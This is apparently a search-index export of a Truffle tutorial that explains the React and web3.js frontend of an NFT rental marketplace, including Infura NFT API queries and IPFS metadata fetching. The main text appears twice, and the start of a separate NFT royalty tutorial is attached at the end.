Infura's NFT API to query for all of a user's NFTs Using an IPFS gateway to upload NFT metadata Using web3.js to call our smart contract functions Watch the livestream on YouTube for a more in-depth walkthrough! The completed code lives here . NOTE: It is assumed you have familiarity with React.js. This tutorial is meant to illustrate how to interact with your smart contracts with Web3js, use Infura's NFT API for querying NFTs, and uploading metadata through the IPFS gateway - NOT teach you the fundamentals of JavaScript or React development. Download System Requirements \u00b6 You'll need to install: Node.js , v14 or higher truffle ganache CLI Create an Infura account and project \u00b6 To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it rentable-nft-marketplace , and select Web3 API from the dropdown Create an Infura IPFS project \u00b6 You'll need Infura IPFS account and dedicated gateway to upload your NFT metadata. To create a IPFS project, select create IPFS project. Then, you'll need to create a unique gateway name. In this project, we'll call it rental-marketplace . You will need to give your own dedicated gateway with its own unique name. Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Get Some Test Eth \u00b6 In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once. Set Up Your Project \u00b6 There's a lot of code to go over, so rather than build it piece by piece, go ahead and just clone the completed code here . Now, we'll go over the high level overview of the project structure, and the key components of how the frontend communicates with the smart contracts we had written before! After cloning the project, you'll need to install the dependencies: cd unleashed_nft_rental_marketplace/truffle npm i cd ../client npm i In order to utilize the NFT API, we'll need to create env.json to store the necessary keys: cp ./src/env.example.json ./src/env.json Then, add your Infura project id, secret, wallet private key, and IPFS subdomain to env.json . The IPFS subdomain should be the UNIQUE SUBDOMAIN NAME you chose, not the full URL. NOTE: Set infuraSdk.active in env.json to false if you are using a ganache instance to test. In this tutorial, we'll be doing everything on goerli. client/src/contexts \u00b6 This folder includes all the files that provide the necessary information to interact with the blockchain. client/src/contexts/EthContext/EthProvider.jsx \u00b6 EthContext contains the code that allows you to connect to the blockchain. Specifically, EthProvider.jsx ... Retrieves the contract abis you will be interacting with useEffect (() => { const tryInit = () => { try { const artifacts = { RentableNft : require ( \"../../contracts/RentableNft.json\" ), Marketplace : require ( \"../../contracts/Marketplace.json\" ) }; init ( artifacts ); } catch ( err ) { console . error ( err ); } }; tryInit (); }, [ init ]); Creates an instance of web3 to retrieve the current network and account information const web3 = new Web3 ( Web3 . givenProvider || \"ws://localhost:8545\" ); const accounts = await web3 . eth . requestAccounts (); const networkID = await web3 . eth . net . getId (); Gets the contract abstraction associated with the currently connected network try { for ( const [ contractName , artifact ] of Object . entries ( artifacts )) { const address = artifact . networks [ networkID ]. address ; const contract = new web3 . eth . Contract ( artifact . abi , address ); contracts [ contractName ] = contract ; } } catch ( err ) { contracts = null ; console . error ( err ); } Updates contracts when the account or network is changed useEffect (() => { const events = [ \"chainChanged\" , \"accountsChanged\" ]; const handleChange = () => { init ( state . artifacts ); }; events . forEach ( e => window . ethereum . on ( e , handleChange )); return () => { events . forEach ( e => window . ethereum . removeListener ( e , handleChange )); }; }, [ init , state . artifacts ]); MetaMask injects a global API at window.ethereum . This API allows websites to request users' Ethereum accounts, read data from blockchains the user is connected to, and suggest that the user sign messages and transactions. window.ethereum.on will detect if the network or account has changed and re-initialize web3 , accounts , networkID , and contracts . As detailed in the MetaMask docs , we should remove the event listener. client/src/contexts/InfuraContext/index.js \u00b6 We are utilizing Infura's NFT API to get the user's owned NFTs. This file instantiates the necessary objects to do so: Auth and sdk . Stepping through the code: An Auth object is created with your Infura project id, secret, and wallet private key that you added to env.json during project set up const auth = new Auth ( env . infuraSdk . authOptions ); We check whether or not we are using ganache, set up the SDK so that we can call the NFT API, and get a web3 and artifacts instance from EthContext as we had covered just above. const { active } = env . infuraSdk ; const [ sdk , _setSdk ] = useState ( new SDK ( auth )); const { state : { web3 , artifacts , networkID }, } = useEth (); Then, we want to get all the NFTs that are owned by the current user and fulfill the rentable criteria. const getOwnedRentableNfts = async ( publicAddress ) => { const { assets } = await sdk . getNFTs ({ publicAddress , includeMetadata : true , }); const filtered = []; for ( const asset of assets ) { if ( await contracts . Marketplace . methods . isRentableNFT ( asset . contract ). call ()) { filtered . push ( asset ); } } return filtered ; }; To break this down further, const { assets } = await sdk . getNFTs ({ publicAddress , includeMetadata : true , }); sdk.getNFTs retrieves all the NFTs and metadata of publicAddress . if ( await contracts . Marketplace . methods . isRentableNFT ( asset . contract ). call ()) { filtered . push ( asset ); } contracts.Marketplace.methods.isRentableNFT is how we call the isRentableNFT function on the smart contract. Note that we got the contracts.Marketplace abstract by using the EthProvider through useEth() like so: const { state : { contracts }, } = useEth (); client/src/contexts/MarketplaceContext/index.js \u00b6 This file aggregates and updates the data for displaying an NFT: updateListings is called whenever an NFT is listed, unlisted, or rented. It gets the image to be displayed by calling using the tokenURI function from the NFT smart contract const nftContract = new web3 . eth . Contract ( artifacts . RentableNft . abi , nftContractAddress ); const tokenUri = await nftContract . methods . tokenURI ( tokenId ). call (); let tokenUriRes ; try { tokenUriRes = await ( await fetch ( getIpfsGatewayUri ( tokenUri ))). json (); } catch ( err ) { console . error ( \"Bad uri\" ); } After resolving the image data, updateListings will transform all the variables into the correct type (i.e., use parseInt to convert pricePerDay from a string to an int ). The final updateListings looks like this: const updateListings = useCallback ( async () => { if ( marketplaceContract ) { const res = await marketplaceContract . methods . getAllListings (). call (); const listingsExtendedTransformed = {}; const listingsExtended = await Promise . all ( res . map ( async listing => { const { nftContract : nftContractAddress , pricePerDay : pricePerDayStr , startDateUNIX : startDateUnixStr , endDateUNIX : endDateUnixStr , expires : expiresStr , tokenId , owner , user } = listing ; const nftContract = new web3 . eth . Contract ( artifacts . RentableNft . abi , nftContractAddress ); const tokenUri = await nftContract . methods . tokenURI ( tokenId ). call (); let tokenUriRes ; try { tokenUriRes = await ( await fetch ( getIpfsGatewayUri ( tokenUri ))). json (); } catch ( err ) { console . error ( \"Bad uri\" ); } // const noUser = parseInt(user) !== 0; const pricePerDay = parseInt ( pricePerDayStr ); const startDateUnix = parseInt ( startDateUnixStr ); const endDateUnix = parseInt ( endDateUnixStr ); const duration = endDateUnix - startDateUnix ; const expires = parseInt ( expiresStr ); const isOwner = owner === accounts [ 0 ]; const isUser = user === accounts [ 0 ]; const transformedData = { pricePerDay , startDateUnix , endDateUnix , duration , expires , user }; const listingExtended = { ... listing , ... transformedData , nftContractAddress , tokenUri , tokenUriRes , isOwner , isUser }; [ ... Array ( 8 ). keys (), \"nftContract\" , \"startDateUNIX\" , \"endDateUNIX\" , ]. forEach ( i => void delete listingExtended [ i ]); if ( listingsExtendedTransformed [ nftContractAddress ]) { listingsExtendedTransformed [ nftContractAddress ][ tokenId ] = transformedData ; } else { listingsExtendedTransformed [ nftContractAddress ] = { [ tokenId ] : transformedData }; } return listingExtended ; }) ); setListings ( listingsExtended ); setListingsTransformed ( listingsExtendedTransformed ); } }, [ marketplaceContract , web3 ? . eth . Contract , artifacts ? . RentableNft . abi , accounts ] ); updateOwnedTokens is called whenever a new NFT is minted to update your owned tokens. It does this in two parts. First, it checks infura.active to see if we are using the Infura NFT SDK, which we would use if we were on a public testnet or mainnet. If so, we call getOwnedRentableNfts to retrieve all of user's NFTs and filter based on rentability. if ( infura . active ) { // Option 1 - Use infura nft sdk if ( accounts && listingsTransformed ) { const res = await infura . getOwnedRentableNfts ( accounts [ 0 ]); const tokens = await Promise . all ( res . map ( async ele => { return { nftContractAddress : ele . contract , tokenId : ele . tokenId , tokenUriRes : ele . metadata , listingData : listingsTransformed [ ele . contract ] ? .[ ele . tokenId ] } }) ) setOwnedTokens ( tokens ); } } Otherwise, we're on ganache, our local test chain, and we will retrieve NFTs based on events emmitted. Specifically, we will track Transfer , which is an event emmitted when calling OpenZeppelin's mint function on their ERC721 contract. Then, we will construct a token by creating a dictionary of the necessary values ( nftContractAddress , tokenId , tokenUri , etc). if ( rentableNftContract && listingsTransformed ) { const { address : nftContractAddress } = rentableNftContract . options ; // This only checks `rentableNftContract`. const mintEvents = await rentableNftContract . getPastEvents ( \"Transfer\" , { filter : { from : \"0x0000000000000000000000000000000000000000\" , to : accounts [ 0 ] }, fromBlock : 0 }); const tokens = await Promise . all ( mintEvents . map ( async mintEvent => { const { tokenId } = mintEvent . returnValues ; const tokenUri = await rentableNftContract . methods . tokenURI ( tokenId ). call (); let tokenUriRes ; try { tokenUriRes = await ( await fetch ( getIpfsGatewayUri ( tokenUri ))). json (); } catch ( err ) { console . error ( \"Bad uri\" ); } return { nftContractAddress , tokenId , tokenUri , tokenUriRes , listingData : listingsTransformed [ nftContractAddress ] ? .[ tokenId ] }; }) ); setOwnedTokens ( tokens ); } The final code looks like this: const updateOwnedTokens = useCallback ( async () => { if ( infura . active ) { // Option 1 - Use infura nft sdk if ( accounts && listingsTransformed ) { const res = await infura . getOwnedRentableNfts ( accounts [ 0 ]); const tokens = await Promise . all ( res . map ( async ele => { return { nftContractAddress : ele . contract , tokenId : ele . tokenId , tokenUriRes : ele . metadata , listingData : listingsTransformed [ ele . contract ] ? .[ ele . tokenId ] } }) ) setOwnedTokens ( tokens ); } } else { // Option - 2 - Use contract events // This is useful when using local network (ganache) or network otherwise unsupported // docs.infura.io/infura/infura-custom-apis/nft-sdk/supported-networks if ( rentableNftContract && listingsTransformed ) { const { address : nftContractAddress } = rentableNftContract . options ; // This only checks `rentableNftContract`. const mintEvents = await rentableNftContract . getPastEvents ( \"Transfer\" , { filter : { from : \"0x0000000000000000000000000000000000000000\" , to : accounts [ 0 ] }, fromBlock : 0 }); const tokens = await Promise . all ( mintEvents . map ( async mintEvent => { const { tokenId } = mintEvent . returnValues ; const tokenUri = await rentableNftContract . methods . tokenURI ( tokenId ). call (); let tokenUriRes ; try { tokenUriRes = await ( await fetch ( getIpfsGatewayUri ( tokenUri ))). json (); } catch ( err ) { console . error ( \"Bad uri\" ); } return { nftContractAddress , tokenId , tokenUri , tokenUriRes , listingData : listingsTransformed [ nftContractAddress ] ? .[ tokenId ] }; }) ); setOwnedTokens ( tokens ); } } }, [ rentableNftContract , listingsTransformed , accounts , infura . getOwnedRentableNfts ]); mint does exactly what it sounds like it does: mint an NFT! In order to call a function causes a change, we use .send() instead of call() . In this case, the caller of mint is the active account, which is indicated by from: accounts[0] . const mint = async ( tokenUri ) => { const tx = await rentableNftContract . methods . mint ( tokenUri ). send ({ from : accounts [ 0 ] }); if ( tx . status ) await updateOwnedTokens (); }; list lists the NFT and also collects the listing fee required to do so. As you can see, we add value: listingFee , which will prompt the user to pay the listingFee when signing the transaction. const list = async ( nftContractAddress , tokenId , price , duration ) => { // Time values are in seconds const buffer = 30 ; const start = Math . ceil ( Date . now () / 1000 ) + buffer ; const end = start + duration ; const listingFee = await marketplaceContract . methods . getListingFee (). call (); const tx = await marketplaceContract . methods . listNFT ( nftContractAddress , tokenId , price , start , end ). send ({ from : accounts [ 0 ], value : listingFee }); if ( tx . status ) await updateListings (); }; unlist is called by the owner of the NFT to take down the listing. It calculates the refund to give if the NFT was currently being rented. const unlist = async ( nftContractAddress , tokenId ) => { const nftContract = new web3 . eth . Contract ( artifacts . RentableNft . abi , nftContractAddress ); const expires = parseInt ( await nftContract . methods . userExpires ( tokenId ). call ()); const { pricePerDay } = listingsTransformed [ nftContractAddress ][ tokenId ]; const refund = Math . ceil (( expires - Date . now () / 1000 ) / 60 / 60 / 24 + 1 ) * pricePerDay ; const options = { from : accounts [ 0 ], value : Math . max ( 0 , refund ) }; const tx = await marketplaceContract . methods . unlistNFT ( nftContractAddress , tokenId ). send ( options ); if ( tx . status ) await updateListings (); }; rent is our final action! This allows users to rent available NFTs. const rent = async ( nftContractAddress , tokenId , duration ) => { const { pricePerDay } = listingsTransformed [ nftContractAddress ][ tokenId ]; const now = Math . ceil ( Date . now () / 1000 ); const expires = now + duration ; const numDays = ( expires - now ) / 60 / 60 / 24 + 1 ; const fee = Math . ceil ( numDays * pricePerDay ); const options = { from : accounts [ 0 ], value : fee }; const tx = await marketplaceContract . methods . rentNFT ( nftContractAddress , tokenId , expires ). send ( options ); if ( tx . status ) await updateListings (); }; client/src/contexts/TimeContext/index.js \u00b6 This file just helps manage all the math we have to do with regards to calculate rental times. client/src/card \u00b6 This folder contains all the code for formatting and interacting with your owned, rented, and listed NFTs. It utilizes functions we defined in the context files we went over above. client/layout client/market client/owned client/rented \u00b6 These folders contain the code for setting up the layout of what each page will look like. client/utils/index.js \u00b6 This file lays out some common utility functions - namely around formatting and time math. You'll note that this is where we do the string manipulation of our IPFS urls to fetch the data for displaying the NFTs. export const IPFS_GATEWAY = `https:// ${ env . infura . ipfs . subdomain } .infura-ipfs.io/ipfs/` ; export function isIpfsUri ( uri ) { return uri . match ( /^ipfs:\\/\\// ); } export function getIpfsGatewayUri ( uri ) { if ( typeof uri === \"string\" ) { const ipfsAddress = uri . replace ( /^ipfs:\\/\\//i , \"\" ); return ` ${ IPFS_GATEWAY }${ ipfsAddress } ` ; } } Future Extensions \u00b6 After this, you've built a full stack dapp! This marketplace has a LOT of functionality, however, retrieving your smart contract abstractions and interacting with them is easy with Web3.js . The bulk of the work is just your classic flavor of frontend web development. If you want to interact with a much simpler marketplace frontend that uses Next.js , check out our NFT Marketplace on Optimism here . Next episode we'll be covering Web3 Communication with Push Protocol - namely, how to add notifications to your dapp! If you want to talk about this content, join our Discord ! If you need help coding, start a discussion here . Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: Build a NFT Rental Marketplace Part 2"}, {"location": "guides/nft-rental-marketplace-2/#web3-unleashed-build-a-nft-rental-marketplace-part-2", "text": "Written by Emily Lin Last updated 11/10/2022", "title": "Web3 Unleashed: Build a NFT Rental Marketplace Part 2"}, {"location": "guides/nft-rental-marketplace-2/#overview", "text": "In episode 2 and 4, we created a rentable NFT and wrote a rental marketplace smart contract to interact with it! If you haven't gone through those two tutorials, they are prerequisites for completing this one. In this guide, we'll create the frontend for the rental marketplace. Specifically, we will cover: Writing a frontend for minting, listing, renting, and viewing NFTs in React Using Infura's NFT API to query for all of a user's NFTs Using an IPFS gateway to upload NFT metadata Using web3.js to call our smart contract functions Watch the livestream on YouTube for a more in-depth walkthrough! The completed code lives here . NOTE: It is assumed you have familiarity with React.js. This tutorial is meant to illustrate how to interact with your smart contracts with Web3js, use Infura's NFT API for querying NFTs, and uploading metadata through the IPFS gateway - NOT teach you the fundamentals of JavaScript or React development.", "title": "Overview"}, {"location": "guides/nft-rental-marketplace-2/#download-system-requirements", "text": "You'll need to install: Node.js , v14 or higher truffle ganache CLI", "title": "Download System Requirements"}, {"location": "guides/nft-rental-marketplace-2/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it rentable-nft-marketplace , and select Web3 API from the dropdown", "title": "Create an Infura account and project"}, {"location": "guides/nft-rental-marketplace-2/#create-an-infura-ipfs-project", "text": "You'll need Infura IPFS account and dedicated gateway to upload your NFT metadata. To create a IPFS project, select create IPFS project. Then, you'll need to create a unique gateway name. In this project, we'll call it rental-marketplace . You will need to give your own dedicated gateway with its own unique name.", "title": "Create an Infura IPFS project"}, {"location": "guides/nft-rental-marketplace-2/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/nft-rental-marketplace-2/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/nft-rental-marketplace-2/#get-some-test-eth", "text": "In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once.", "title": "Get Some Test Eth"}, {"location": "guides/nft-rental-marketplace-2/#set-up-your-project", "text": "There's a lot of code to go over, so rather than build it piece by piece, go ahead and just clone the completed code here . Now, we'll go over the high level overview of the project structure, and the key components of how the frontend communicates with the smart contracts we had written before! After cloning the project, you'll need to install the dependencies: cd unleashed_nft_rental_marketplace/truffle npm i cd ../client npm i In order to utilize the NFT API, we'll need to create env.json to store the necessary keys: cp ./src/env.example.json ./src/env.json Then, add your Infura project id, secret, wallet private key, and IPFS subdomain to env.json . The IPFS subdomain should be the UNIQUE SUBDOMAIN NAME you chose, not the full URL. NOTE: Set infuraSdk.active in env.json to false if you are using a ganache instance to test. In this tutorial, we'll be doing everything on goerli.", "title": "Set Up Your Project"}, {"location": "guides/nft-rental-marketplace-2/#clientsrccontexts", "text": "This folder includes all the files that provide the necessary information to interact with the blockchain.", "title": "client/src/contexts"}, {"location": "guides/nft-rental-marketplace-2/#clientsrccontextsethcontextethproviderjsx", "text": "EthContext contains the code that allows you to connect to the blockchain. Specifically, EthProvider.jsx ... Retrieves the contract abis you will be interacting with useEffect (() => { const tryInit = () => { try { const artifacts = { RentableNft : require ( \"../../contracts/RentableNft.json\" ), Marketplace : require ( \"../../contracts/Marketplace.json\" ) }; init ( artifacts ); } catch ( err ) { console . error ( err ); } }; tryInit (); }, [ init ]); Creates an instance of web3 to retrieve the current network and account information const web3 = new Web3 ( Web3 . givenProvider || \"ws://localhost:8545\" ); const accounts = await web3 . eth . requestAccounts (); const networkID = await web3 . eth . net . getId (); Gets the contract abstraction associated with the currently connected network try { for ( const [ contractName , artifact ] of Object . entries ( artifacts )) { const address = artifact . networks [ networkID ]. address ; const contract = new web3 . eth . Contract ( artifact . abi , address ); contracts [ contractName ] = contract ; } } catch ( err ) { contracts = null ; console . error ( err ); } Updates contracts when the account or network is changed useEffect (() => { const events = [ \"chainChanged\" , \"accountsChanged\" ]; const handleChange = () => { init ( state . artifacts ); }; events . forEach ( e => window . ethereum . on ( e , handleChange )); return () => { events . forEach ( e => window . ethereum . removeListener ( e , handleChange )); }; }, [ init , state . artifacts ]); MetaMask injects a global API at window.ethereum . This API allows websites to request users' Ethereum accounts, read data from blockchains the user is connected to, and suggest that the user sign messages and transactions. window.ethereum.on will detect if the network or account has changed and re-initialize web3 , accounts , networkID , and contracts . As detailed in the MetaMask docs , we should remove the event listener.", "title": "client/src/contexts/EthContext/EthProvider.jsx"}, {"location": "guides/nft-rental-marketplace-2/#clientsrccontextsinfuracontextindexjs", "text": "We are utilizing Infura's NFT API to get the user's owned NFTs. This file instantiates the necessary objects to do so: Auth and sdk . Stepping through the code: An Auth object is created with your Infura project id, secret, and wallet private key that you added to env.json during project set up const auth = new Auth ( env . infuraSdk . authOptions ); We check whether or not we are using ganache, set up the SDK so that we can call the NFT API, and get a web3 and artifacts instance from EthContext as we had covered just above. const { active } = env . infuraSdk ; const [ sdk , _setSdk ] = useState ( new SDK ( auth )); const { state : { web3 , artifacts , networkID }, } = useEth (); Then, we want to get all the NFTs that are owned by the current user and fulfill the rentable criteria. const getOwnedRentableNfts = async ( publicAddress ) => { const { assets } = await sdk . getNFTs ({ publicAddress , includeMetadata : true , }); const filtered = []; for ( const asset of assets ) { if ( await contracts . Marketplace . methods . isRentableNFT ( asset . contract ). call ()) { filtered . push ( asset ); } } return filtered ; }; To break this down further, const { assets } = await sdk . getNFTs ({ publicAddress , includeMetadata : true , }); sdk.getNFTs retrieves all the NFTs and metadata of publicAddress . if ( await contracts . Marketplace . methods . isRentableNFT ( asset . contract ). call ()) { filtered . push ( asset ); } contracts.Marketplace.methods.isRentableNFT is how we call the isRentableNFT function on the smart contract. Note that we got the contracts.Marketplace abstract by using the EthProvider through useEth() like so: const { state : { contracts }, } = useEth ();", "title": "client/src/contexts/InfuraContext/index.js"}, {"location": "guides/nft-rental-marketplace-2/#clientsrccontextsmarketplacecontextindexjs", "text": "This file aggregates and updates the data for displaying an NFT: updateListings is called whenever an NFT is listed, unlisted, or rented. It gets the image to be displayed by calling using the tokenURI function from the NFT smart contract const nftContract = new web3 . eth . Contract ( artifacts . RentableNft . abi , nftContractAddress ); const tokenUri = await nftContract . methods . tokenURI ( tokenId ). call (); let tokenUriRes ; try { tokenUriRes = await ( await fetch ( getIpfsGatewayUri ( tokenUri ))). json (); } catch ( err ) { console . error ( \"Bad uri\" ); } After resolving the image data, updateListings will transform all the variables into the correct type (i.e., use parseInt to convert pricePerDay from a string to an int ). The final updateListings looks like this: const updateListings = useCallback ( async () => { if ( marketplaceContract ) { const res = await marketplaceContract . methods . getAllListings (). call (); const listingsExtendedTransformed = {}; const listingsExtended = await Promise . all ( res . map ( async listing => { const { nftContract : nftContractAddress , pricePerDay : pricePerDayStr , startDateUNIX : startDateUnixStr , endDateUNIX : endDateUnixStr , expires : expiresStr , tokenId , owner , user } = listing ; const nftContract = new web3 . eth . Contract ( artifacts . RentableNft . abi , nftContractAddress ); const tokenUri = await nftContract . methods . tokenURI ( tokenId ). call (); let tokenUriRes ; try { tokenUriRes = await ( await fetch ( getIpfsGatewayUri ( tokenUri ))). json (); } catch ( err ) { console . error ( \"Bad uri\" ); } // const noUser = parseInt(user) !== 0; const pricePerDay = parseInt ( pricePerDayStr ); const startDateUnix = parseInt ( startDateUnixStr ); const endDateUnix = parseInt ( endDateUnixStr ); const duration = endDateUnix - startDateUnix ; const expires = parseInt ( expiresStr ); const isOwner = owner === accounts [ 0 ]; const isUser = user === accounts [ 0 ]; const transformedData = { pricePerDay , startDateUnix , endDateUnix , duration , expires , user }; const listingExtended = { ... listing , ... transformedData , nftContractAddress , tokenUri , tokenUriRes , isOwner , isUser }; [ ... Array ( 8 ). keys (), \"nftContract\" , \"startDateUNIX\" , \"endDateUNIX\" , ]. forEach ( i => void delete listingExtended [ i ]); if ( listingsExtendedTransformed [ nftContractAddress ]) { listingsExtendedTransformed [ nftContractAddress ][ tokenId ] = transformedData ; } else { listingsExtendedTransformed [ nftContractAddress ] = { [ tokenId ] : transformedData }; } return listingExtended ; }) ); setListings ( listingsExtended ); setListingsTransformed ( listingsExtendedTransformed ); } }, [ marketplaceContract , web3 ? . eth . Contract , artifacts ? . RentableNft . abi , accounts ] ); updateOwnedTokens is called whenever a new NFT is minted to update your owned tokens. It does this in two parts. First, it checks infura.active to see if we are using the Infura NFT SDK, which we would use if we were on a public testnet or mainnet. If so, we call getOwnedRentableNfts to retrieve all of user's NFTs and filter based on rentability. if ( infura . active ) { // Option 1 - Use infura nft sdk if ( accounts && listingsTransformed ) { const res = await infura . getOwnedRentableNfts ( accounts [ 0 ]); const tokens = await Promise . all ( res . map ( async ele => { return { nftContractAddress : ele . contract , tokenId : ele . tokenId , tokenUriRes : ele . metadata , listingData : listingsTransformed [ ele . contract ] ? .[ ele . tokenId ] } }) ) setOwnedTokens ( tokens ); } } Otherwise, we're on ganache, our local test chain, and we will retrieve NFTs based on events emmitted. Specifically, we will track Transfer , which is an event emmitted when calling OpenZeppelin's mint function on their ERC721 contract. Then, we will construct a token by creating a dictionary of the necessary values ( nftContractAddress , tokenId , tokenUri , etc). if ( rentableNftContract && listingsTransformed ) { const { address : nftContractAddress } = rentableNftContract . options ; // This only checks `rentableNftContract`. const mintEvents = await rentableNftContract . getPastEvents ( \"Transfer\" , { filter : { from : \"0x0000000000000000000000000000000000000000\" , to : accounts [ 0 ] }, fromBlock : 0 }); const tokens = await Promise . all ( mintEvents . map ( async mintEvent => { const { tokenId } = mintEvent . returnValues ; const tokenUri = await rentableNftContract . methods . tokenURI ( tokenId ). call (); let tokenUriRes ; try { tokenUriRes = await ( await fetch ( getIpfsGatewayUri ( tokenUri ))). json (); } catch ( err ) { console . error ( \"Bad uri\" ); } return { nftContractAddress , tokenId , tokenUri , tokenUriRes , listingData : listingsTransformed [ nftContractAddress ] ? .[ tokenId ] }; }) ); setOwnedTokens ( tokens ); } The final code looks like this: const updateOwnedTokens = useCallback ( async () => { if ( infura . active ) { // Option 1 - Use infura nft sdk if ( accounts && listingsTransformed ) { const res = await infura . getOwnedRentableNfts ( accounts [ 0 ]); const tokens = await Promise . all ( res . map ( async ele => { return { nftContractAddress : ele . contract , tokenId : ele . tokenId , tokenUriRes : ele . metadata , listingData : listingsTransformed [ ele . contract ] ? .[ ele . tokenId ] } }) ) setOwnedTokens ( tokens ); } } else { // Option - 2 - Use contract events // This is useful when using local network (ganache) or network otherwise unsupported // docs.infura.io/infura/infura-custom-apis/nft-sdk/supported-networks if ( rentableNftContract && listingsTransformed ) { const { address : nftContractAddress } = rentableNftContract . options ; // This only checks `rentableNftContract`. const mintEvents = await rentableNftContract . getPastEvents ( \"Transfer\" , { filter : { from : \"0x0000000000000000000000000000000000000000\" , to : accounts [ 0 ] }, fromBlock : 0 }); const tokens = await Promise . all ( mintEvents . map ( async mintEvent => { const { tokenId } = mintEvent . returnValues ; const tokenUri = await rentableNftContract . methods . tokenURI ( tokenId ). call (); let tokenUriRes ; try { tokenUriRes = await ( await fetch ( getIpfsGatewayUri ( tokenUri ))). json (); } catch ( err ) { console . error ( \"Bad uri\" ); } return { nftContractAddress , tokenId , tokenUri , tokenUriRes , listingData : listingsTransformed [ nftContractAddress ] ? .[ tokenId ] }; }) ); setOwnedTokens ( tokens ); } } }, [ rentableNftContract , listingsTransformed , accounts , infura . getOwnedRentableNfts ]); mint does exactly what it sounds like it does: mint an NFT! In order to call a function causes a change, we use .send() instead of call() . In this case, the caller of mint is the active account, which is indicated by from: accounts[0] . const mint = async ( tokenUri ) => { const tx = await rentableNftContract . methods . mint ( tokenUri ). send ({ from : accounts [ 0 ] }); if ( tx . status ) await updateOwnedTokens (); }; list lists the NFT and also collects the listing fee required to do so. As you can see, we add value: listingFee , which will prompt the user to pay the listingFee when signing the transaction. const list = async ( nftContractAddress , tokenId , price , duration ) => { // Time values are in seconds const buffer = 30 ; const start = Math . ceil ( Date . now () / 1000 ) + buffer ; const end = start + duration ; const listingFee = await marketplaceContract . methods . getListingFee (). call (); const tx = await marketplaceContract . methods . listNFT ( nftContractAddress , tokenId , price , start , end ). send ({ from : accounts [ 0 ], value : listingFee }); if ( tx . status ) await updateListings (); }; unlist is called by the owner of the NFT to take down the listing. It calculates the refund to give if the NFT was currently being rented. const unlist = async ( nftContractAddress , tokenId ) => { const nftContract = new web3 . eth . Contract ( artifacts . RentableNft . abi , nftContractAddress ); const expires = parseInt ( await nftContract . methods . userExpires ( tokenId ). call ()); const { pricePerDay } = listingsTransformed [ nftContractAddress ][ tokenId ]; const refund = Math . ceil (( expires - Date . now () / 1000 ) / 60 / 60 / 24 + 1 ) * pricePerDay ; const options = { from : accounts [ 0 ], value : Math . max ( 0 , refund ) }; const tx = await marketplaceContract . methods . unlistNFT ( nftContractAddress , tokenId ). send ( options ); if ( tx . status ) await updateListings (); }; rent is our final action! This allows users to rent available NFTs. const rent = async ( nftContractAddress , tokenId , duration ) => { const { pricePerDay } = listingsTransformed [ nftContractAddress ][ tokenId ]; const now = Math . ceil ( Date . now () / 1000 ); const expires = now + duration ; const numDays = ( expires - now ) / 60 / 60 / 24 + 1 ; const fee = Math . ceil ( numDays * pricePerDay ); const options = { from : accounts [ 0 ], value : fee }; const tx = await marketplaceContract . methods . rentNFT ( nftContractAddress , tokenId , expires ). send ( options ); if ( tx . status ) await updateListings (); };", "title": "client/src/contexts/MarketplaceContext/index.js"}, {"location": "guides/nft-rental-marketplace-2/#clientsrccontextstimecontextindexjs", "text": "This file just helps manage all the math we have to do with regards to calculate rental times.", "title": "client/src/contexts/TimeContext/index.js"}, {"location": "guides/nft-rental-marketplace-2/#clientsrccard", "text": "This folder contains all the code for formatting and interacting with your owned, rented, and listed NFTs. It utilizes functions we defined in the context files we went over above.", "title": "client/src/card"}, {"location": "guides/nft-rental-marketplace-2/#clientlayout-clientmarket-clientowned-clientrented", "text": "These folders contain the code for setting up the layout of what each page will look like.", "title": "client/layout client/market client/owned client/rented"}, {"location": "guides/nft-rental-marketplace-2/#clientutilsindexjs", "text": "This file lays out some common utility functions - namely around formatting and time math. You'll note that this is where we do the string manipulation of our IPFS urls to fetch the data for displaying the NFTs. export const IPFS_GATEWAY = `https:// ${ env . infura . ipfs . subdomain } .infura-ipfs.io/ipfs/` ; export function isIpfsUri ( uri ) { return uri . match ( /^ipfs:\\/\\// ); } export function getIpfsGatewayUri ( uri ) { if ( typeof uri === \"string\" ) { const ipfsAddress = uri . replace ( /^ipfs:\\/\\//i , \"\" ); return ` ${ IPFS_GATEWAY }${ ipfsAddress } ` ; } }", "title": "client/utils/index.js"}, {"location": "guides/nft-rental-marketplace-2/#future-extensions", "text": "After this, you've built a full stack dapp! This marketplace has a LOT of functionality, however, retrieving your smart contract abstractions and interacting with them is easy with Web3.js . The bulk of the work is just your classic flavor of frontend web development. If you want to interact with a much simpler marketplace frontend that uses Next.js , check out our NFT Marketplace on Optimism here . Next episode we'll be covering Web3 Communication with Push Protocol - namely, how to add notifications to your dapp! If you want to talk about this content, join our Discord ! If you need help coding, start a discussion here . Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future Extensions"}, {"location": "guides/nft-royalty/", "text": "Web3 Unleashed: Write an NFT Smart Contract with Royalties \u00b6 Written by Emily Lin Last updated 8/5/2022 Overview \u00b6 In this chapter of Web3 Unleashed, we're going to briefly go over what an Ethereum Improvement Proposal (EIP) and an Ethereum Request for Comment (ERC) is, how they are used, and implement the ERC-2981, NFT royalty standard, as an example. What is an EIP? \u00b6 EIP stands for Ethereum Improvement Proposal, a technical design document that specifies new features and processes for Ethereum. EIPs serve as the primary mechanism for Proposing new features Collecting community technical input on an issue Documenting the design decisions that have gone into Ethereum. There are three types of EIPs: Standard Track describes any change that affects most or all Ethereum implementations. This is further split into the categories Core 